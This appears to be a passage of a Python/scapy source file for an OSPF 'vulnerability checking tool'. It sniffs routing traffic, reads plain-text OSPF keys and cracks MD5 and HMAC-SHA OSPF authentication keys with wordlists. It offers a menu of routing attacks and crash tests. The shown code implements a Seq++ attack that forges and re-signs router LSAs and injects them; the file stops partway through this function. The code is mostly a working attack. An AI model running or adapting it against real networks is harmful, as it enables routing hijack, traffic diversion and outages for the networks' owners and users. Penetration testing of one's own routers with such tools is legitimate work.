#!/usr/bin/python

from scapy.all import *
import time
import hashlib
import fnmatch
import os



print ("\n")
print("====================================================================================")
print ("\n")
print(" .----------------. .----------------. .----------------.") 
print("| .--------------. | .--------------. | .--------------. |")
print("| |     ____     | | |    _______   | | | ____   ____  | |")
print("| |   .'    `.   | | |   /  ___  |  | | ||_  _| |_  _| | |")
print("| |  /  .--.  \  | | |  |  (__ \_|  | | |  \ \   / /   | |")
print("| |  | |    | |  | | |   '.___`-.   | | |   \ \ / /    | |")
print("| |  \  `--'  /  | | |  |`\____) |  | | |    \ ' /     | |")
print("| |   `.____.'   | | |  |_______.'  | | |     \_/      | |")
print("| |              | | |              | | |              | |")
print("| '--------------' | '--------------' | '--------------' |")
print(" '----------------' '----------------' '----------------' ")
print("")
print ("OSV - OSPF Vulnerability Checking Tool - By Nick Kasem")
print("Ver - 1.2 - 1/12/17\n")
print("====================================================================================\n")
print("Total vulnerability checking support: 10\n")
print("====================================================================================\n")
print("-> -'Ctrl+c' to exit program\n")
print("-> -Please reload routers after perform each attack to get an accurate results\n")
print("====================================================================================\n")
time.sleep(1)
print ("Checking for any OSPF packet in the network\n")


##note typeospf 1-Hello 2-DBDesc 3-LSReq 4-LSUpd 5-LSAck

########### Start of selecting attack	
def Authenidentify():

	def findAuth():
		a=pkts[0][OSPF_Hdr].authdata
		b=format(a, 'x') #get rid of 0x
		return b.decode("hex") #change from hex to ascii
		global key_padd
		key_padd = b.decode("hex")
		
		
	def md5_crypto_attack():
		ospf_header_nov4 = pkts[0][OSPF_Hdr] #cut ipv4 header out
		ospf_header_cuthash = str(ospf_header_nov4)[:pkts[0][OSPF_Hdr].len] #cut out hash
		print("Here are usable wordlist(s) in the current directory to perform password cracking" + "\n")
		
		for file in os.listdir('.'): #<< list all txt files
			if fnmatch.fnmatch(file, '*.txt'):
				print "-", file
		print("")		
		print ("Enter wordlist file you want to use")					
		while True: #infinite loop
			print(">"),
			wordlist_input = raw_input()
			try:
				open(wordlist_input, 'r')
				break  #if can open the wordlist, then break infinite loop
			except IOError:  #No such file or mistype, Please re-input.
				print ("No such file or directory, please re-input valid file listed above or type Ctrl + D to quit ")
		print ("\n")
		print ("Performing password-cracking from " + wordlist_input + ", may take up to 5 minutes depending on wordlist size")
		time.sleep(1)
		start_time = time.time()
		for line in open(wordlist_input, 'r'):
			key = line.strip()
			global key_padd
			#print(key) #<<<will take more time to print out all of the text
			
			if len(key)<16:
				key_padd = key + ('\x00'*(16-len(key)))
			else: 
				key_padd = key[:16]
			
			ospf_header_combine = ospf_header_cuthash + key_padd
			genhash = hashlib.md5()
			genhash.update(ospf_header_combine)
		
			if genhash.digest() == Auth_data_decode:
				print ("Key found! secret-key is: " +key_padd)
				elapsed_time = time.time() - start_time
				print(elapsed_time)
				break
			#else: print("Key not found from Dictionary attack: " + genhash.hexdigest())	
		if genhash.digest() != Auth_data_decode:
			print ("\n")
			print("Key not found from this wordlist")
	def sha1_crypto_attack():
		ospf_header_nov4 = pkts[0][OSPF_Hdr] #cut ipv4 header out
		ospf_header_cuthash = str(ospf_header_nov4)[:pkts[0][OSPF_Hdr].len] #left only pure header, no auth hash at the back
		print("Here are usable wordlist in the directory to perform password cracking" + "\n")
		for file in os.listdir('.'): #<< list all txt files
			if fnmatch.fnmatch(file, '*.txt'):
				print "-", file
		print("")		
		print ("Enter wordlist file you want to use")					
		while True: #infinite loop
			print(">"),
			wordlist_input = raw_input()
			try:
				open(wordlist_input, 'r')
				break  #if can open the wordlist, then break infinite loop
			except IOError:  #No such file or mistype, Please re-input.
				print ("No such file or directory, please re-input valid file listed above or type Ctrl + D to quit ")
		print ("\n")
		print ("Performing password-cracking from " + wordlist_input + " may take up to 5 minutes depends on wordlist size")
		time.sleep(1)
		start_time = time.time()
		
		for line in open(wordlist_input, 'r'):
			key = line.strip()
			global key_padd
			#print(key) #sharp this <<<will take more time to print out all of the text
			
			if len(key)<64:
				 key_padd = key + ('\x00'*(64-len(key)))
			else: 
				 key_padd = key[:64]
				
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(5))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha1()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha1()
			genhash2.update(hash_sum_2)
			
			#print(genhash2.hexdigest())
	
			if genhash2.digest() == Auth_data_decode:
				print ("Key found! secret-key is: " +key_padd)
				elapsed_time = time.time() - start_time
				print(elapsed_time)
				break
			#else: print("Key not found from Dictionary attack: " + genhash2.hexdigest())	#<<sharp this
		if genhash2.digest() != Auth_data_decode:
			print ("\n")
			print("Key not found from this wordlist")
	def sha256_crypto_attack():
		ospf_header_nov4 = pkts[0][OSPF_Hdr] #cut ipv4 header out
		ospf_header_cuthash = str(ospf_header_nov4)[:pkts[0][OSPF_Hdr].len] #left only pure header, no auth hash at the back
		print("Here are usable wordlist in the directory to perform password cracking" + "\n")
		for file in os.listdir('.'): #<< list all txt files
			if fnmatch.fnmatch(file, '*.txt'):
				print "-", file
		print("")		
		print ("Enter wordlist file you want to use")					
		while True: #infinite loop
			print(">"),
			wordlist_input = raw_input()
			try:
				open(wordlist_input, 'r')
				break  #if can open the wordlist, then break infinite loop
			except IOError:  #No such file or mistype, Please re-input.
				print ("No such file or directory, please re-input valid file listed above or type Ctrl + D to quit ")
		print ("\n")
		print ("Performing password-cracking from " + wordlist_input + " may take up to 5 minutes depends on wordlist size")
		time.sleep(1)
		start_time = time.time()
		for line in open(wordlist_input, 'r'):
			key = line.strip()
			global key_padd
			#print(key) <<<will take more time to print out all of the text
			
			if len(key)<64:
				key_padd = key + ('\x00'*(64-len(key)))
			else: 
				key_padd = key[:64]
				
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(8))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha256()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha256()
			genhash2.update(hash_sum_2)
			
			#print(genhash2.hexdigest())
	
			if genhash2.digest() == Auth_data_decode:
				print ("Key found! secret-key is: " +key_padd)
				elapsed_time = time.time() - start_time
				print(elapsed_time)
				break
			#else: print("Key not found from Dictionary attack: " + genhash.hexdigest())	
		if genhash2.digest() != Auth_data_decode:
			print ("\n")
			print("Key not found from this wordlist")
	def sha384_crypto_attack():
		ospf_header_nov4 = pkts[0][OSPF_Hdr] #cut ipv4 header out
		ospf_header_cuthash = str(ospf_header_nov4)[:pkts[0][OSPF_Hdr].len] #left only pure header, no auth hash at the back
		print("Here are usable wordlist in the directory to perform password cracking" + "\n")
		
		for file in os.listdir('.'): #<< list all txt files
			if fnmatch.fnmatch(file, '*.txt'):
				print "-", file
		print("")		
		print ("Enter wordlist file you want to use")					
		while True: #infinite loop
			print(">"),
			wordlist_input = raw_input()
			try:
				open(wordlist_input, 'r')
				break  #if can open the wordlist, then break infinite loop
			except IOError:  #No such file or mistype, Please re-input.
				print ("No such file or directory, please re-input valid file listed above or type Ctrl + D to quit ")
		print ("\n")
		print ("Performing password-cracking from " + wordlist_input + " may take up to 5 minutes depends on wordlist size")
		time.sleep(1)
		start_time = time.time()
		for line in open(wordlist_input, 'r'):
			key = line.strip()
			global key_padd
			#print(key) <<<will take more time to print out all of the text
			
			if len(key)<128:
				key_padd = key + ('\x00'*(128-len(key)))
			else: 
				key_padd = key[:128]
				
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(12))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha384()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha384()
			genhash2.update(hash_sum_2)
			
			#print(genhash2.hexdigest())
	
			if genhash2.digest() == Auth_data_decode:
				print ("Key found! secret-key is: " +key_padd)
				elapsed_time = time.time() - start_time
				print(elapsed_time)
				break
			#else: print("Key not found from Dictionary attack: " + genhash.hexdigest())	
		if genhash2.digest() != Auth_data_decode:
			print ("\n")
			print("Key not found from this wordlist")
	def sha512_crypto_attack():
		ospf_header_nov4 = pkts[0][OSPF_Hdr] #cut ipv4 header out
		ospf_header_cuthash = str(ospf_header_nov4)[:pkts[0][OSPF_Hdr].len] #left only pure header, no auth hash at the back
		print("Here are usable wordlist in the directory to perform password cracking" + "\n")
		
		for file in os.listdir('.'): #<< list all txt files
			if fnmatch.fnmatch(file, '*.txt'):
				print "-", file
		print("")		
		print ("Enter wordlist file you want to use")					
		while True: #infinite loop
			print(">"),
			wordlist_input = raw_input()
			try:
				open(wordlist_input, 'r')
				break  #if can open the wordlist, then break infinite loop
			except IOError:  #No such file or mistype, Please re-input.
				print ("No such file or directory, please re-input valid file listed above or type Ctrl + D to quit ")
		print ("")
		print ("Performing password-cracking from " + wordlist_input + " may take up to 5 minutes depends on wordlist size")
		time.sleep(1)
		start_time = time.time()
		for line in open(wordlist_input, 'r'):
			key = line.strip()
			global key_padd
			#print(key) <<<will take more time to print out all of the text
			
			if len(key)<128:
				key_padd = key + ('\x00'*(128-len(key)))
			else: 
				key_padd = key[:128]
				
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(16))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha512()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha512()
			genhash2.update(hash_sum_2)
			
			#print(genhash2.hexdigest())
	
			if genhash2.digest() == Auth_data_decode:
				print ("")
				print ("Key found! secret-key is: " +key_padd)
				elapsed_time = time.time() - start_time
				print(elapsed_time)
				break
			#else: print("Key not found from Dictionary attack: " + genhash.hexdigest())	
		if genhash2.digest() != Auth_data_decode:
			print ("")
			print("Key not found from this wordlist")
	'''#<<<<	#comment out when use pcap | comment in when want sniff
	pkts=rdpcap('sha512.pcap') 
	
	raw_load = pkts[0][Raw].load
	raw_load = raw_load.encode('hex')

	Pac_length = raw_load[4:8] #<<<finding length of packet of ospf to find the beginning of auth data
	pac_duct = int(Pac_length,16)

	Auth_length = raw_load[38:40] #<<<<finding length of authen data
	Auth_duct = int(Auth_length,16)
	
	Auth_data = raw_load[pac_duct*2:pac_duct*2+(Auth_duct*2)]
	Auth_data_decode = Auth_data.decode('hex')
	
	load_contrib('ospf') #Loading module after getting raw header info
	
	pkts=rdpcap('sha512.pcap') #Load again to get info from module ospf
	''' #<<<< #comment in when want to sniff and use pcap
		 
	#pkts=sniff(filter="ip dst 224.0.0.5",count=1)
	#while pkts[0][Raw].load[1:2] != '\x01':
		#pkts=sniff(filter="ip dst 224.0.0.5",count=1)
		
	
	pkts=sniff(filter="ip proto 0x59", count=1)	
	
	def Packet_type():
		if pkts[0][Raw].load[1:2] == '\x01':
			return "Hello Packet (Type 1) Captured"
		elif pkts[0][Raw].load[1:2] == '\x02':
			return "Database Description Packet (Type 2) Captured"
		elif pkts[0][Raw].load[1:2] == '\x03':
			return "Link State Request Packet (Type 3) Captured"
		elif pkts[0][Raw].load[1:2] == '\x04':
			return "Link State Update Packet (Type 4) Captured"
		elif pkts[0][Raw].load[1:2] == '\x05':
			return "Link State Acknowledgement Packet (Type 5) Captured"
		else: return "Unknown OSPF Packet type Captured"
		
	wrpcap("Temp_OSPF_Sniff.pcap",pkts[0])
	raw_load = pkts[0][Raw].load
	raw_load = raw_load.encode('hex')

	Pac_length = raw_load[4:8] #<<<finding length of packet of ospf to find the beginning of auth data
	pac_duct = int(Pac_length,16)

	Auth_length = raw_load[38:40] #<<<<finding length of authen data
	Auth_duct = int(Auth_length,16)
	
	Auth_data = raw_load[pac_duct*2:pac_duct*2+(Auth_duct*2)]
	Auth_data_decode = Auth_data.decode('hex')
	
	print("This network is running OSPF")
	time.sleep(1)
	print(Packet_type() + "\n")
	time.sleep(1)
	print("Checking for Authentication Type")
	time.sleep(2)
	
	load_contrib('ospf')
	pkts=rdpcap("Temp_OSPF_Sniff.pcap")
	global authenTY
	#<<< #comment out when want to sniff | comment in when want to use pcap ||notness
	if (pkts[0][OSPF_Hdr].authtype == 0):
		authenTY="***This OSPF network has No Authentication***, consider vulnerable for using weak authentication scheme"
		print ("***This OSPF network has No Authentication***"+ "\n")
		print("====================================================================================\n")
		global key_padd
		key_padd = "None"
	elif (pkts[0][OSPF_Hdr].authtype == 1):
		authenTY="***This OSPF network has Plain-text Authentication, consider vulnerable for using weak authentication scheme***"
		print ("***This OSPF network has Plain-text Authentication***"+ "\n")
		print("====================================================================================\n")
		time.sleep(2)
		print ("The Authentication-key is " + findAuth())
	elif (pkts[0][OSPF_Hdr].authtype == 2 and pkts[0][OSPF_Hdr].authdatalen == 16):
		authenTY="***This OSPF network has Cryptographic Authentication '(MD5)'***"
		print ("***This OSPF network has Cryptographic Authentication '(MD5)'***"+ "\n")
		print("====================================================================================\n")
		time.sleep(2)
		md5_crypto_attack()
	elif (pkts[0][OSPF_Hdr].authtype == 2 and pkts[0][OSPF_Hdr].authdatalen == 20):
		authenTY="***This OSPF network has Cryptographic Authentication '(HMAC-SHA-1)'***"
		print ("***This OSPF network has Cryptographic Authentication '(HMAC-SHA-1)'***"+ "\n")
		print("====================================================================================\n")
		time.sleep(2)
		sha1_crypto_attack()
	elif (pkts[0][OSPF_Hdr].authtype == 2 and pkts[0][OSPF_Hdr].authdatalen == 32):
		authenTY="***This OSPF network has Cryptographic Authentication '(HMAC-SHA-256)'***"
		print ("***This OSPF network has Cryptographic Authentication '(HMAC-SHA-256)'***"+ "\n")
		print("====================================================================================\n")
		time.sleep(2)
		sha256_crypto_attack()
	elif (pkts[0][OSPF_Hdr].authtype == 2 and pkts[0][OSPF_Hdr].authdatalen == 48):
		authenTY="***This OSPF network has Cryptographic Authentication '(HMAC-SHA-384)'***"
		print ("***This OSPF network has Cryptographic Authentication '(HMAC-SHA-384)'***"+ "\n")
		print("====================================================================================\n")
		time.sleep(2)
		sha384_crypto_attack()
	elif (pkts[0][OSPF_Hdr].authtype == 2 and pkts[0][OSPF_Hdr].authdatalen == 64):
		authenTY="***This OSPF network has Cryptographic Authentication '(HMAC-SHA-512)'***"
		print ("***This OSPF network has Cryptographic Authentication '(HMAC-SHA-512)'***"+ "\n")
		print("====================================================================================\n")
		time.sleep(2)
		sha512_crypto_attack()
	else: 
		print ("This OSPF network has unknown Authentication scheme")
	
		

	
	time.sleep(3)	
Authenidentify()
########### End of cryto identifying 
global sta1
sta1 = "       Not yet tested"
global sta2
sta2 = "       Not yet tested"
global sta3
sta3 = "       Not yet tested"
global sta4
sta4 = "       Not yet tested"
global sta5
sta5 = "       Not yet tested"
global sta6
sta6 = "       Not yet tested"
global sta7
sta7 = "       Not yet tested"
global sta8
sta8 = "       Not yet tested"
global sta91
sta91 = "          Not yet tested"
global sta92
sta92 = "          Not yet tested"
global sta93
sta93 = "          Not yet tested"
global sta10
sta10 = "       Not yet tested"
########### Start of selecting Attacks
def main():
	print ("")
	print("====================================================================================")
	print ("")
	print ("Please select an attack")
	print ("")

	#sta1 = "Not yet tested"
	
	def list_result():	
		print authenTY
		if key_padd is not None:
			print "Secret-key found: " + key_padd + "\n"
		print("[1] Seq++ Attack")
		print(sta1)
		print("[2] MaxAge Attack")
		print(sta2)
		print("[3] MaxSequence Attack")
		print(sta3)
		print("[4] Disguised LSA Attack (Owning the Routing Table Part I)")
		print(sta4)
		print("[5] Remote false adjacency Attack (Owning the Routing Table Part I)")
		print(sta5)
		print("[6] Persistent OSPF Attack(Owning the Routing Table Part II)")
		print(sta6)
		print("[7] DR/BDR Re-Electing Attack")
		print(sta7)
		print("[8] Sending large number of neighbor announcement (crash test)")
		print(sta8)
		print("[9] Sending LSA-update with crafted length fields")
		print("   [9.1] Invalid Value in Length field(length = 0) (crash test)")
		print(sta91)
		print("   [9.2] Value in length field larger than actual length (crash test)")
		print(sta92)
		print("   [9.3] Value in length field smaller than actual length (crash test)")
		print(sta93)
		print("[10] Sending large size OSPF Router-LSA Packet (crash test)")
		print(sta10)
		print ("\n")
		raw_input("Press Enter to continue...")
		main()
		#Attacks()
		
		
	def Attack_type(A):
		if(A=="1"):
			return " Seq++ Attack"
		elif(A=="2"):
			return " MaxAge Attack"
		elif(A=="3"):
			return " MaxSequence Attack"
		elif(A=="4"):
			return " Disguised LSA Attack (Owning the Routing Table Part I)"
		elif(A=="5"):
			return " Remote false adjacency Attack (Owning the Routing Table Part I)"
		elif(A=="6"):
			return " Persistent OSPF Attack(Owning the Routing Table Part II)"
		elif(A=="7"):
			return " DR/BDR Re-Electing Attack"
		elif(A=="8"):
			return " Sending large number of neighbor announcement (crash test)"
		#elif(A=="9"):
			#return " Sending LSA-update with crafted length fields"
		elif(A=="9.1"):
			return " Invalid Value in Length field(length = 0) (crash test)"
		elif(A=="9.2"):
			return " Value in length field larger than actual length (crash test)"
		elif(A=="9.3"):
			return " Value in length field smaller than actual length (crash test)"
		elif(A=="10"):
			return " Sending large size OSPF Router-LSA Packet (crash test)"
		#elif(A=="all" or A=="All"):
			#return " All of the Attacks"	
		elif(A=="status"):
			return "status"
		else: 
			return "Out of list"

	
	print("[1]" + Attack_type("1"))
	print("[2]" + Attack_type("2"))
	print("[3]" + Attack_type("3"))
	print("[4]" + Attack_type("4"))
	print("[5]" + Attack_type("5"))
	print("[6]" + Attack_type("6"))
	print("[7]" + Attack_type("7"))
	print("[8]" + Attack_type("8"))
	print("[9] Sending LSA-update with crafted length fields")
	print("   [9.1]" + Attack_type("9.1"))
	print("   [9.2]" + Attack_type("9.2"))
	print("   [9.3]" + Attack_type("9.3"))
	print("[10]" + Attack_type("10"))
	print ("\n")
	
	print ("Enter attack number you want to test or type 'status' to list all previous results")
	
	
	while True:
		global Selected_Attack
		print(">"),
		Selected_Attack = raw_input()
		#print Attack_type(Selected_Attack)
		if Attack_type(Selected_Attack) != "Out of list":
			break
		else: print ("Invalid, Please re-input attack number you want to test")
			
	
	if(Selected_Attack == "1" or Selected_Attack == "2" or Selected_Attack == "3" or Selected_Attack == "4"
	or Selected_Attack == "5" or Selected_Attack == "6" or Selected_Attack == "7" or Selected_Attack == "8"
	or Selected_Attack == "9.1" or Selected_Attack == "9.2" or Selected_Attack == "9.3" or Selected_Attack == "10"):
		print("")
		print("====================================================================================")
		print (" \nCommencing testing on " + "[" + Selected_Attack + "]" + Attack_type(Selected_Attack))
	elif (Selected_Attack == 'status'):
		print("Summary Report")
		print("")
		list_result()
	else:
		print("Invalid Input")
main()
########### End of Selecting Attacks

def Attacks():

	def get_authtype(LSU_chk):
		if (LSU_chk[OSPF_Hdr].authtype == 0):
			#print ("***This LSU has No Authentication***"+ "\n")
			return "0_no"
		elif (LSU_chk[OSPF_Hdr].authtype == 1):
			#print ("***This LSU has Plain-text Authentication***"+ "\n")
			return "1_plain"
		elif (LSU_chk[OSPF_Hdr].authtype == 2 and LSU_chk[OSPF_Hdr].authdatalen == 16):
			#print ("***This LSU has Cryptographic Authentication '(MD5)'***"+ "\n")
			return "2_md"
		elif (LSU_chk[OSPF_Hdr].authtype == 2 and LSU_chk[OSPF_Hdr].authdatalen == 20):
			#print ("***This LSU has Cryptographic Authentication '(HMAC-SHA-1)'***"+ "\n")
			return "2_sha1"
		elif (LSU_chk[OSPF_Hdr].authtype == 2 and LSU_chk[OSPF_Hdr].authdatalen == 32):
			#print ("***This LSU has Cryptographic Authentication '(HMAC-SHA-256)'***"+ "\n")
			return "2_sha256"
		elif (LSU_chk[OSPF_Hdr].authtype == 2 and LSU_chk[OSPF_Hdr].authdatalen == 48):
			#print ("***This LSU has Cryptographic Authentication '(HMAC-SHA-384)'***"+ "\n")
			return "2_sha384"
		elif (LSU_chk[OSPF_Hdr].authtype == 2 and LSU_chk[OSPF_Hdr].authdatalen == 64):
			#print ("***This LSU has Cryptographic Authentication '(HMAC-SHA-512)'***"+ "\n")
			return "2_sha512"
		else: 
			print ("Error, this OSPF network has unknown Authentication scheme")	
		
	def one_seqPP_attack(): #Done <plus or pai duay
		print("")
		load_contrib('ospf')
		print("Intercepting OSPF's LSU. Please wait, this may take up to 30 minutes")
		
		def stopfilter(x):
			if x[OSPF_Hdr].type == 4 and "OSPF_Router_LSA" in x :
				return True
			else:
				return False
		pkts_atk=sniff(filter="ip proto 0x59", stop_filter=stopfilter) 
		
		def chkvuln(keep_seq, R_id):
			pkts_chk=sniff(filter="ip proto 0x59", timeout = 20)
			global sta1
			FFb=False
			for index in range(len(pkts_chk)): 
				try: 
					if pkts_chk[index][OSPF_Router_LSA].seq == keep_seq+1 and pkts_chk[index][OSPF_Router_LSA].id == R_id:
						sta1 = "     Fightback engaged, not vulnerable for Seq++ Attack"
						print "Fightback engaged, not vulnerable for Seq++ Attack"
						FFb=True
						break;
				except IndexError:
					FFb=False
					continue
			if FFb != True:
				sta1 = "     No fightback engaged, vulnerable for Seq++ Attack"
				print("No fightback engaged, vulnerable for Seq++ Attack")
		
		lenpkts = len(pkts_atk)-1 #to select the last packet captured from sniffed
		if get_authtype(pkts_atk[lenpkts]) == "0_no" :
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 12
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			R_id = pkts_atk[lenpkts][OSPF_Router_LSA].id
			sendp(pkts_atk[lenpkts], verbose=1)

			print ("")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_atk[lenpkts], verbose=1)
			print("Checking for Vulnerability")
			chkvuln(keep_seq, R_id)
			##Check by receiveack within 10 sec, and check with same ack and Packetchksum

		elif get_authtype(pkts_atk[lenpkts]) == "1_plain" :
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 1
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			print ("")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_atk[lenpkts], verbose=1)
			print("Checking for Vulnerability")
			chkvuln(keep_seq)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_md" :
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 1
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #cut out hash
			#print key_padd
			ospf_header_combine = ospf_header_cuthash + key_padd
			genhash = hashlib.md5()
			genhash.update(ospf_header_combine)
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash.digest() #obtain the Layer2,3 header
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print ("")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			print("Checking for Vulnerability")
			chkvuln(keep_seq)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha1" :	
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(5))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha1()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha1()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			print("Checking for Vulnerability")
			chkvuln(keep_seq)
		
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha256" :	
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(8))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha256()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha256()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			print("Checking for Vulnerability")
			chkvuln(keep_seq)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha384" :	
